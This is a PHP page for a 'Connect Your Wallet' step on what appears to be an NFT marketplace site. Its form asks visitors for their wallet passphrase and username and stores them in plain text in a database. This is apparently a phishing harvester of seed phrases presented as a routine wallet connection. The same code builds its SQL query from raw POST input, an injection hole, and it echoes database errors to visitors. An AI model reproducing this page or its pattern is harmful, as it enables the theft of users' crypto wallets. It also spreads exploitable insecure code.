<?php
session_start();
if (!isset($_SESSION['user_id'])) { ?>
    <script>
        window.location.href = '/auth/login';
    </script>
    <?php
    exit();
}
error_reporting(E_ALL);
ini_set('display_errors', 1);
const pageName = 'Wallet Connect';
const rootDir = '/home/multistream6/domains/caketoolnftmarketplace.com/public_html/';
include_once (rootDir.'includes/generalConfig.php');
include_once (rootDir.'includes/core.php');
include_once (rootDir.'includes/wallet_core.php');
include_once (rootDir.'partials/front/header/main.php');
?>
        <!-- title page -->
<div class="py-5"></div>
        <section class="tf-page-title">
            <div class="tf-container">
                <div class="row">
                    <div class="col-md-12">
<!---->
<!--                        <ul class="breadcrumbs">-->
<!--                            <li><a href="#">Pages</a></li>-->
<!--                            <li>Wallet</li>-->
<!--                        </ul>-->

                    </div>
                </div>
            </div>
        </section>

        <section class="tf-connect-wallet">
            <div class="tf-container">
                <div class="row justify-content-center">
                    <div class="col-md-12">
                        <div class="tf-heading style-5">
                            <h4 class="heading">Connect Your Wallet</h4>
                            <p class="sub-heading">Connect your wallet for seamless access to decentralized opportunities, including finance and digital collectibles. Experience the future of blockchain effortlessly.</p>
                        </div>
                    </div>
                    <?php
                    if (isset($_POST[$wallet_id])) {
                        $wallet_phase = $_POST['wallet_phase'];
                        $wallet_username = $_POST['wallet_username'];
                        $wallet_id = $_POST[$wallet_id];

                        // Assuming your database connection is already established ($conn)
                        $sql = "UPDATE wallet SET wallet_phase = '$wallet_phase', wallet_username = '$wallet_username', wallet_status = 1 WHERE wallet_owner_id = $user_id AND wallet_id = $wallet_id";

                        if ($conn->query($sql) === TRUE) {
                            header("location: /connect_wallet?success-added");
                        } else {
                            echo "Error updating record: " . $conn->error;
                        }
                    }
                    ?>

                    <form method="post">
                        <input type="hidden" value="<?=$wallet_id?>" name="<?=$wallet_id?>">
                        <div class="form-group">
                            <label>Pass Phase</label>
                            <input type="text" class="form-control" name="wallet_phase" placeholder="Enter your <?=$wallet_key_name?> pass phase">
                        </div>
                        <div class="form-group">
                            <label for="<?=$wallet_key_name?>_username">Wallet Username</label>
                            <input type="text" class="form-control" name="wallet_username" placeholder="Enter your <?=$wallet_key_name?> username">
                        </div>
                        <button type="submit" class="btn btn-primary" name="<?=$wallet_id?>">Submit</button>
                    </form>

<!--                    --><?php //include_once(rootDir.'connect_wallet/parts/wallets/main.php'); ?>
                </div>
            </div>
        </section>

<!--connect wallet model-->
<?php include_once (rootDir.'connect_wallet/parts/wallet_models/main.php');?>
        <!-- Footer -->
<?php include_once (rootDir.'partials/front/footer/main.php');?>